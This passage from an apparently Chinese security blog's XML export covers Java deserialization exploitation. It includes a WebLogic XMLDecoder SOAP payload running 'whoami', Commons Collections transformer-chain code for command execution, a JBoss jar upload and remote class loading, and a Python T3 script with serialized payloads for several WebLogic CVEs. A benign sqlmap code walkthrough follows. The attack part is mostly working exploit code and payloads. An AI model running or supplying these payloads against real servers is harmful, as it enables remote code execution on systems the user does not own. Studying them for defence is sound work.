616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034&lt;/string&gt; &lt;/void&gt; &lt;void class=&quot;org.mozilla.classfile.DefiningClassLoader&quot;&gt; &lt;void method=&quot;defineClass&quot;&gt; &lt;string&gt;com.supeream.exploits.XmlExp&lt;/string&gt; &lt;object idref=&quot;cls&quot;&gt;&lt;/object&gt; &lt;void method=&quot;newInstance&quot;&gt; &lt;void method=&quot;say&quot; id=&quot;proc&quot;&gt; &lt;string&gt;whoami&lt;/string&gt; &lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;void class=&quot;java.lang.Thread&quot; method=&quot;currentThread&quot;&gt; &lt;void method=&quot;getCurrentWork&quot;&gt; &lt;void method=&quot;getResponse&quot;&gt; &lt;void method=&quot;getServletOutputStream&quot;&gt; &lt;void method=&quot;writeStream&quot;&gt; &lt;object idref=&quot;proc&quot;&gt;&lt;/object&gt; &lt;/void&gt; &lt;void method=&quot;flush&quot;/&gt; &lt;/void&gt; &lt;void method=&quot;getWriter&quot;&gt;&lt;void method=&quot;write&quot;&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 总结发现POC早就是好几年前的了，主要是XMLDecoder组件没修，附：检测脚本。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>java</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commons Collections Java 反序列化漏洞总结]]></title>
    <url>%2F2017%2F11%2F11%2Fjava-deserialize%2F</url>
    <content type="text"><![CDATA[概述Java 反序列化漏洞，‍‍序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。 序列化与反序列化12345String obj ="hello, world! This is a test!";FileOutputStream fos = new FileOutputStream("test/object");ObjectOutputStream os = new ObjectOutputStream(fos);os.writeObject(obj);os.close(); 12345FileInputStream fis = new FileInputStream("test/object");ObjectInputStream ois = new ObjectInputStream(fis);String obj2 = (String) ois.readObject(); System.out.print(obj2);ois.close(); 最后输出为hello, world! This is a test!。 Commons Collections JavaApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。当然Java反序列化的问题就是出在org.apache.commons.collections这个库，这个库里的Package如下图所示： 123456789101112org.apache.commons.collectionsorg.apache.commons.collections.bagorg.apache.commons.collections.bidimaporg.apache.commons.collections.bufferorg.apache.commons.collections.collectionorg.apache.commons.collections.comparatorsorg.apache.commons.collections.functorsorg.apache.commons.collections.iteratorsorg.apache.commons.collections.keyvalueorg.apache.commons.collections.listorg.apache.commons.collections.maporg.apache.commons.collections.set 里面主要涉及到的类有ConstantTransformer、InvokerTransformer等 整个poc的逻辑可以这么理解，构建了BeforeTransformerMap的键值对，为其赋值，利用TransformedMap的decorate方法，可以对Map数据结构的key，value进行transforme。 TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。 TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）); poc中对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行。 在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。 结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。 因此我们在poc中看见了下行的代码。 123456789101112131415161718192021222324252627282930 Transformer transforms[] = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;commands&#125; )&#125;;Transformer transformerChain = new ChainedTransformer(transforms);Map tempMap = new HashMap();tempMap.put("value", "tentacle");Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;);ctor.setAccessible(true);instance = ctor.newInstance(new Object[] &#123;Target.class, exMap&#125;);ByteArrayOutputStream bo = new ByteArrayOutputStream(10);ObjectOutputStream out = new ObjectOutputStream(bo);out.writeObject(instance);out.flush();out.close();return bo.toByteArray(); 如果要实现一个可控的poc，需要对transformer链的构造进行理解。首先来看InvokerTransformer。 123456789101112131415 Transformer transforms[] = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;commands&#125; )&#125;; 这样，这段恶意代码本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于： 1((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec(commands); 其对应关系如下： 123456789101112131415161718192021222324// ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作Transformer transformerChain = new ChainedTransformer(transforms);// Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式Map tempMap = new HashMap();tempMap.put("value", "orleven");// 对Map类的数据结构进行转化// TransformedMap.decorate(目标Map, key的转化对象(单个或者链或者null), value的转化对象(单个或者链或者null));Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); //实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为精心构造的恶意TransformedMap对象。Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;);ctor.setAccessible(true);instance = ctor.newInstance(new Object[] &#123;Target.class, exMap&#125;);// 序列化后转化为byte数组，提交给未做安全检测的Java应用。Java应用在进行反序列化操作时，则会触发TransformedMap的变换函数，执行预设的命令。ByteArrayOutputStream bo = new ByteArrayOutputStream(10);ObjectOutputStream out = new ObjectOutputStream(bo);out.writeObject(instance);out.flush();out.close();return bo.toByteArray(); JBossJBoss JMXInvokerServlet 反序列化JBoss JMXInvokerServlet 存在反序列化漏洞。invoker/JMXInvokerServlet 可直接向http://192.168.111.145:8080/invoker/JMXInvokerServlet发送特殊构造的恶意代码，但是由于这个漏洞本身不回显，漏洞一开始并不好利用。后来大佬们通常先上传一个jar文件，然后通过加载Jar的方式进行异常封装，从而解决了回显的问题,具体poc如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103public static Object fileupload(String filepath, byte[] data) &#123; Object instance = null; try &#123;// ((FileOutputStream)FileOutputStream.class.getDeclaredConstructor(null).newInstance(null)).write(data); Transformer transforms[] = &#123; new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getDeclaredConstructor", new Class[] &#123;Class[].class&#125;, new Object[] &#123;new Class[] &#123;String.class&#125;&#125; ), new InvokerTransformer("newInstance", new Class[] &#123;Object[].class&#125;, new Object[] &#123;new Object[] &#123;filepath&#125;&#125; ), new InvokerTransformer("write", new Class[] &#123;byte[].class&#125;, new Object[] &#123;data&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put("value", "orleven"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;); ctor.setAccessible(true); instance = ctor.newInstance(new Object[]&#123;Target.class, exMap&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); return null; &#125; return instance; &#125;public static Object classInject(String packUri, String className, String[] code) &#123; Object instance = null; try &#123; // ((URLClassLoader)URLClassLoader.class.getMethod("newInstance",null).invoke(null,packUri)).loadClass(className).getMethod("main",null).invoke(null,code) Transformer transforms[] = &#123; new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"newInstance", new Class[] &#123;URL[].class&#125;&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[] &#123;new URL[] &#123;new URL(packUri)&#125;&#125;&#125; ), new InvokerTransformer("loadClass", new Class[] &#123;String.class&#125;, new Object[] &#123;className&#125;), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"main", new Class[] &#123;String[].class&#125;&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[] &#123;code&#125;&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put("value", "orleven"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;); ctor.setAccessible(true); instance = ctor.newInstance(new Object[]&#123;Target.class, exMap&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); return null; &#125; return instance; &#125; public static byte[] getPayload(Object instance)&#123; try&#123; ByteArrayOutputStream bo = new ByteArrayOutputStream(10); ObjectOutputStream out = new ObjectOutputStream(bo); out.writeObject(instance); out.flush(); out.close(); return bo.toByteArray(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; // 上传jar getPayload(fileupload("util.jar",filedata)); // 执行命令 getPayload(classInject("file:util.jar","jc.util.CommUtil",new String[]&#123;"data","-action","runcmd","uname -a"&#125;)); // 下载文件 getPayload(classInject("file:util.jar","jc.util.CommUtil",new String[]&#123;"data","-action","file-download",filename&#125;)); JBoss CVE-2017-12149JBoss /invoker/readonly 存在反序列化漏洞，即没有对数据进行任何的安全处理便进行了反序列化处理，造成了漏洞的形成。 访问服务器的/invoker/readonly页面，服务器返回500错误 这个漏洞的POC和前一个JBoss反序列化漏洞基本相同，所以这里就不贴代码了。 发送payload后服务端的日志如下： Weblogic因为weblogic会把异常直接打印到服务器端的控制台上，所以在jboss中通过异常封装回显的方法在weblogic上并不适用。但是weblogic有更方便的方法，weblogic是通过T3协议来传输序列化的类，那我们就可以通过T3协议来实现exploit和server的通信，因为weblogic的T3协议和WEB协议共用同一个端口，所以只要能访问weblogic，就可以利用，不需要加载远程类，因此对服务器能否连外网没有要求。 T3 协议这里主要介绍下T3协议，不想看的可以跳过这里。T3 也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。WebLogic Server 中的 RMI（远程方法调用） 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。请参阅“管理控制台联机帮助”中的配置 T3 协议。 使用T3协议向服务器发送数据：1t3 7.0.0.0\nAS:10\nHL:19\n\n 第一行为t3加weblogic客户端的版本号。 weblogic服务器的返回数据为:1HELO:10.0.2.0.false\nAS:2048\nHL:19\n\n 第一行为HELO:加weblogic服务器的版本号。weblogic客户端与服务器发送的数据均以\n\n结尾。 经测试，使用1t3 9.2.0\nAS:255\nHL:19\n\n 字符串作为T3的协议头发送给weblogic9、weblogic10g、weblogic11g、weblogic12c均合法。 在收到服务器的返回数据包后，就可了发送poc了。 poc的结构为：发送的数据长度 + weblogic的固定数据 + 反序列化的恶意代码 + 其他数据，具体如下： 即可触发漏洞。 CVE-2015-4852这个版本没有任何的过滤，可直接利用。 CVE-2016-0638、CVE-2016-3510、CVE-2017-3248因为weblogic的补丁是采用黑名单的过滤方式进行修补，容易有绕过的方式，下面就是大佬们的相关脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-import socketimport timeimport re## @author iswin@threathunter.org# reffer: nessus#VUL=['CVE-2016-0638','CVE-2016-3510','CVE-2017-3248']PAYLOAD=['aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78','aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870','aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078']VER_SIG=['weblogic.jms.common.StreamMessageImpl','org.apache.commons.collections.functors.InvokerTransformer','\\$Proxy[0-9]+']def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) print 'handshake successful'def buildT3RequestObject(sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('&#123;:04x&#125;'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))def sendEvilObjData(sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('&#123;:08x&#125;'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) res = '' try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception as e: pass return resdef checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)&gt;0: print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]) else: print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index])def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(50) server_addr = (dip, dport) t3handshake(sock,server_addr) buildT3RequestObject(sock,dport) rs=sendEvilObjData(sock,PAYLOAD[index]) checkVul(rs,server_addr,index)if __name__=="__main__": dip = '10.8.56.17' dport = 7001 for i in range(0,len(VUL)): run(dip,dport,i) WebSphereCVE-2015-4852WebSphere的反序列化漏洞发生的位置在SOAP的通信端口8880，使用的通信协议是https，发送的数据是XML格式的数据。 这个版本的Websphere没进行任何的过滤处理，直接进行了反序列化。 所以只要把恶意代码（和之前jboss的攻击方式一样）base64编码后通过SOAP协议发送至有漏洞的服务器即可命令执行。 JenkinsCVE-2015-8103想要使用这个漏洞利用Java应用，则需要找一个序列化对象的接收入口，并且这个Java应用使用了Commons Collections库。Jenkins是一个开源的持续集成软件。Jenkins启动后会开放多个端口，除了Web控制台之外还有一个CLI端口。CLI端口为随机的高端口，通过jenkins目录下的WEB-INF/jenkins-cli.jar程序可以和CLI端口进行通信。分析通信数据包发现存在base64编码的Java序列化特征值rO0AB。 jenkins-cli.jar在与CLI端口通信之前，会先HTTP GET请求一下jenkins的Web控制台，从响应包中解析出CLI的端口，再做后续通信。 从下图的head头部可以看到随机的序列化对象的接收入口。 X-Jenkins-CLI2-Port是采用SSL加密通信，而如果未解析到X-Jenkins-CLI2-Port头，则会解析X-Jenkins-CLI-Port头，此时Jenkins-CLI通信协议自动降为Version1，并且无SSL加密。 只要将恶意代码序列化后进行base64加密（base64编码后不能有换行），并代替掉之前截到的数据包中的base64字段即可。 由于此漏洞的命令执行结果也是不回显的，上传jar包的方式也只能打印到控制台，依旧不能解决回显问题。如果采用nslookup等方式来检测漏洞也常有漏网之鱼（如果服务器不能主动向外发包）。 总结花了几天时间复现了这些著名的漏洞，颇有收获，稍微了解了各个中间件的一些情况以及的反序列化漏洞的触发方式。 参考文章1参考文章2参考文章3参考文章4参考文章5参考文章6参考文章7参考文章8参考文章9]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>java</tag>
        <tag>java unserialize</tag>
        <tag>jboss</tag>
        <tag>weblogic</tag>
        <tag>jenkins</tag>
        <tag>websphere</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap Code Analysis]]></title>
    <url>%2F2017%2F09%2F27%2Fsqlmap-code-analysis%2F</url>
    <content type="text"><![CDATA[概述不得不承认，Sqlmap是目前使用人数最多，功能最复杂的SQL注入工具。作为一款开源工具，开发者有意的让我们自行去阅读并对其进行扩充，从Github可以看出一直在更新的。对于渗透人员来说，阅读sqlmap源码是很有必要的，我们可以从它的源码之中学习到一些优秀的代码编写思维以及方式，应用到平时的渗透中去。 Sqlmap的结构首先看看Sqlmap的目录结构： 目录说明: 123456789101112131415Doc 帮助文档Extra 拓展程序，包含多种额外功能，例如运行cmd、安全执行、shellcode等Lib 类库程序，包含多种连接库，如5种注入类型、提权操作Plugins 插件程序，包括各种数据库的信息以及数据库的通用事项Procs sql语句，包含oracle，postgresql 等的dns_request程序、Mysql的读写文件、mssql的xp_cmdshell等sql语句Shell shell应用，包含多个语言注入成功的shell脚本Tamper 多个绕过程序Thirdparty 第三方程序，如beautifulsoup、优化，保持连接，颜色等等Txt 爆破字典，如浏览器类型、 表，列字典Udf 用户定义的mysql的攻击载荷Waf waf防火墙特征指纹Xml 多种数据库检测载荷以及指纹定义sqlmap.conf 配置文件sqlmap.py 主程序sqlmap.api 接口程序 Sqlmap的流程图如下所示： 概括起来就是当在命令行输入命令的时候，sqlmap首先会进行初始化的操作（版本检测、模块检测、命令行参数解析、Session读取等），之后便会简单的检测是否存在注入点，如果存在注入点便会进行进一步的注入，最后才是接管（takeover）操作。 Sqlmap初始化大部分工具在进行攻击时都会进行初始化，Sqlmap也不例外。为了保证Sqlmap的正常运行首先需要进行python的版本、功能模块的自检。 1234567891011121314151617181920212223# sqlmap.py 开头，这里利用__import__()抛出的异常来检查必要库的存在。try: __import__("lib.utils.versioncheck") # this has to be the first non-standard importexcept ImportError: exit("[!] wrong installation detected (missing modules). Visit 'https://github.com/sqlmapproject/sqlmap/#installation' for further details")``` 下面是import的模块：``` python# /lib/utils/versioncheck.py if PYVERSION &gt;= "3" or PYVERSION &lt; "2.6": exit("[CRITICAL] incompatible Python version detected ('%s'). For successfully running sqlmap you'll have to use version 2.6.x or 2.7.x (visit 'http://www.python.org/download/')" % PYVERSION)extensions = ("gzip", "ssl", "sqlite3", "zlib")try: for _ in extensions: __import__(_)except ImportError: errMsg = "missing one or more core extensions (%s) " % (", ".join("'%s'" % _ for _ in extensions)) errMsg += "most likely because current version of Python has been " errMsg += "built without appropriate dev packages (e.g. 'libsqlite3-dev')" exit(errMsg) 在这之后才进入main()函数,而main()函数的开头便是检查环境（路径、版本）、输出banner信息、读取命令行参数。这里主要关注的是modulePath()函数，为了方便在Windows以及Linux上运行，这里统一将操作系统的编码转化为Unicode编码后返回： 1234567891011121314# sqlmap.pydef main(): checkEnvironment() setPaths(modulePath()) banner() # Store original command line options for possible later restoration cmdLineOptions.update(cmdLineParser().__dict__) nitOptions(cmdLineOptions) ....def modulePath(): ... return getUnicode(os.path.dirname(os.path.realpath(_)), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING) 之后利用python的optionparser模块来对输入的参数进行分析，在此之前，提取出第一个参数前的内容，例python sqlmap.py作为参数传入OptionParser之后就是对参数进行分析了，首先是帮助、版本、log级有关参数。 123456789# /lib/parse/cmdline def cmdLineParser(argv=None): ... try: parser.add_option("--hh", dest="advancedHelp",action="store_true",help="Show advanced help message and exit") parser.add_option("--version", 